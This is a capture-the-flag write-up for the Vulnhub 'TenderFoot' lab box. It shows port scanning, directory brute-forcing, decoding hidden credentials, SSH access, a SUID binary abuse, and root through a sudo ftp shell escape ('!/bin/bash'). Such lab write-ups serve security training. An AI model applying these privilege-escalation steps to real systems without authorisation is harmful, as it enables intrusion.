---
title: Vulnhub - TenderFoot
description: My writeup on TenderFoot box.
categories:
 - vulnhub
tags: vulnhub
---

![](https://i.imgur.com/wjyiTq8.png)

## Box Stats

| Box Info      | Details       | 
| ------------- |:-------------:| 
| Box Name :    | **TenderFoot**  | 
| Series :      | **TenderFoot**         |
| Difficulty :  | **Easy**             |   
| Release Date :| **5 Oct 2020**      |    
| OS :          | **GNU/Linux**        |   
| Maker :       | [Anant Chauhan](https://twitter.com/_Anant_chauhan){:target="_blank"}     | 
| Download :    | [TenderFoot](https://www.vulnhub.com/entry/tenderfoot-1,581/){:target="_blank"}      | 

## Summary

Let's pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.7                                                                                                                                                                130 ↵
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 11:37 EET
Nmap scan report for tenderfoot.zte.com.cn (192.168.1.7)
Host is up (0.00049s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:E6:8D (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds
$ nmap -p 22,80 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 11:37 EET
Nmap scan report for tenderfoot.zte.com.cn (192.168.1.7)
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:b7:2d:95:e1:06:7f:a3:f1:8e:bc:5b:4c:29:19:61 (RSA)
|   256 42:0c:c9:6d:1d:e9:84:19:6a:8a:d5:51:2c:69:c6:98 (ECDSA)
|_  256 14:4d:74:42:78:67:9b:f3:dd:00:40:24:4d:12:c9:de (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Let's start the enumeration with port 80, i tried lot of wordlists but only the big from [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content){:target="_blank"} worked! (takes some time)

```
$ gobuster dir -q -u http://$ip/ -w $big -x php,txt,html,js
/index.html (Status: 200)
/entry.js (Status: 200)
/robots.txt (Status: 200)
/hint (Status: 301)
/server-status (Status: 403)
/fotocd (Status: 301)
```

## Shell as monica

2 interesting stuff here first is the `/entry.js` that provide us a username:

```
$ curl http://$ip/entry.js
monica
```

& `/fotocd` source code has brainfuck code in it, i always use this [decoder](https://www.splitbrain.org/_static/ook/){:target="_blank"}

```
=================
JDk5OTkwJA==
=================

Did you found username ?
if yes:
    Then you have cred. of one user, enter into user account 
    by ssh port. syntax:{ssh username@IP}
if not:
    Then enumerate more :)
    G00D LUCK !
```

Let's base64 decode this and get shell.

```
$ echo JDk5OTkwJA== | base64 -d
$99990$                                                                                                                                                                             $ ssh monica@$ip
monica@192.168.1.7's password: 

monica@TenderFoot:~$ whoami;id
monica
uid=1001(monica) gid=1001(monica) groups=1001(monica)
```

## Shell as chandler

Checking the SUIDs we can find a really interesting binary, if we run it we get access as `chandler`:

```
monica@TenderFoot:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 44680 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 27  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /bin/umount
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /bin/mount
-rwsr-xr-x 1 root root 44168 May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 8720 Oct  4 18:09 /opt/exec/chandler
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 54256 Mar 27  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 39904 Mar 27  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 89904 May  6  2015 /usr/bin/netkit-ftp
-rwsr-xr-x 1 root root 40432 Mar 27  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 136808 Feb  1  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 32944 Mar 27  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75304 Mar 27  2019 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 32944 Mar 27  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 71824 Mar 27  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 84120 Apr 10  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 110792 Jul 11 00:23 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root messagebus 42992 Jun 12 01:36 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 May 27 04:47 /usr/lib/openssh/ssh-keysign
monica@TenderFoot:~$ /opt/exec/chandler
chandler@TenderFoot:~$ whoami;id
chandler
uid=1000(chandler) gid=1000(chandler) groups=1000(chandler),1001(monica)
```

## Shell as root

Under `.cache` folder we can see a `note.txt`:

```
chandler@TenderFoot:/home/chandler/.cache$ ls -la
total 16
drwx------ 2 chandler chandler 4096 Oct  4 18:42 .
drwxr-xr-x 4 chandler chandler 4096 Oct  4 20:20 ..
-rw-r--r-- 1 chandler chandler    0 Oct  4 16:15 motd.legal-displayed
-rw-r--r-- 1 root     root      655 Oct  4 18:42 note.txt
-rw-r--r-- 1 root     root      775 Oct  4 18:19 user2.txt
chandler@TenderFoot:/home/chandler/.cache$ cat note.txt 
================================================================================

If you have reach till here, congrats you solved 90% of the B0X!

Now your next task is to get root shell! , for that i use binary

like previously you did to get chandler's shell. Same you have to do 

difference is monica can not run sudo commands but chandler can run sudo 

commands. I'll give you a master key, this may be help you somewhere :)

When you found SUID/binary then search how to get root shell by this binary
GTFOBins may help you.

KEY --> OBQXG43XMQ5FSMDVINZDIY3LJUZQ====

===============================================================================
```

`chandler can run sudo commands` & we have his password, it's base32 let's decode it:

```
chandler@TenderFoot:/home/chandler/.cache$ echo OBQXG43XMQ5FSMDVINZDIY3LJUZQ==== | base32 -d
passwd:Y0uCr4ckM3
```

If we run `sudo -l` we can't see the binary:

```
chandler@TenderFoot:/home/chandler/.cache$ sudo -l
[sudo] password for chandler: 
Sorry, user chandler may not run sudo on TenderFoot.
```

We have to login as chandler using ssh & we can exploit FTP easy:

```
$ ssh chandler@$ip                                                                                                                                                              
chandler@192.168.1.7's password: 

chandler@TenderFoot:~$ sudo -l
Matching Defaults entries for chandler on TenderFoot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User chandler may run the following commands on TenderFoot:
    (root) NOPASSWD: /usr/bin/ftp
chandler@TenderFoot:~$ sudo ftp
ftp> !/bin/bash
root@TenderFoot:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

## Reading the flag(s)

```
root@TenderFoot:~# cat /root/proof.txt 


**************************************************************************************************************
'########:'########:'##::: ##:'########::'########:'########::'########::'#######:::'#######::'########:'####:*
... ##..:: ##.....:: ###:: ##: ##.... ##: ##.....:: ##.... ##: ##.....::'##.... ##:'##.... ##:... ##..:: ####:*
::: ##:::: ##::::::: ####: ##: ##:::: ##: ##::::::: ##:::: ##: ##::::::: ##:::: ##: ##:::: ##:::: ##:::: ####:*
::: ##:::: ######::: ## ## ##: ##:::: ##: ######::: ########:: ######::: ##:::: ##: ##:::: ##:::: ##::::: ##::*
::: ##:::: ##...:::: ##. ####: ##:::: ##: ##...:::: ##.. ##::: ##...:::: ##:::: ##: ##:::: ##:::: ##:::::..:::*
::: ##:::: ##::::::: ##:. ###: ##:::: ##: ##::::::: ##::. ##:: ##::::::: ##:::: ##: ##:::: ##:::: ##::::'####:*
::: ##:::: ########: ##::. ##: ########:: ########: ##:::. ##: ##:::::::. #######::. #######::::: ##:::: ####:*
:::..:::::........::..::::..::........:::........::..:::::..::..:::::::::.......::::.......::::::..:::::....::*
*************************************************************************************************************


Congratulations! you found last flag of tenderfoot :)
I'll be glad if you take screenshot of this and give me feedback on,

Twitter --> (@_Anant_chauhan)
Discord --> (infinity_#9175)
Linkedin --> (https://www.linkedin.com/in/anant-chauhan-a07b2419b)


root@TenderFoot:~# cat /home/monica/user1.txt 
                                                            @@@@@@@,                                 
                                                          @@@@@@@@@&                                
                                                         &@@@@@@@@@@*                               
                                                        @@@@@@@@@@@@,                               
                                                      .@@@@@@@@@@@@@                                
                                                     @@@@@@@@@@@@@@                                 
                                                   @@@@@@@@@@@@@@@                                  
                                                /@@@@@@@@@@@@@@@&                                   
                                             .@@@@@@@@@@@@@@@@@,                                    
                                           @@@@@@@@@@@@@@@@@@@                                      
                                        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*                     
                    (%%%%%%%%%%%%*   ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                  
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                  
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                  
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                   
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&                   
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                  
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&.                    
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                    
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(                    
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                     
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*                      
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                      
                   @@@@@@@@@@@@@@@%   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  

========================================================
========================================================

Great! Y0U F0UND Y0UR FIR5T FL4G!

Try to Find out user2.txt (your 2nd flag) :)

========================================================
========================================================
root@TenderFoot:~# cat /home/chandler/.cache/user2.txt 


 ██████╗ ██████╗  ██████╗ ██╗     ██╗
██╔════╝██╔═████╗██╔═████╗██║     ██║
██║     ██║██╔██║██║██╔██║██║     ██║
██║     ████╔╝██║████╔╝██║██║     ╚═╝
╚██████╗╚██████╔╝╚██████╔╝███████╗██╗
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝
                                     

===================================
Great You got your 2nd Flag too! :)

You are one step away from root!
===================================
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"} :blush:

Until next time keep pwning hard! :fire:

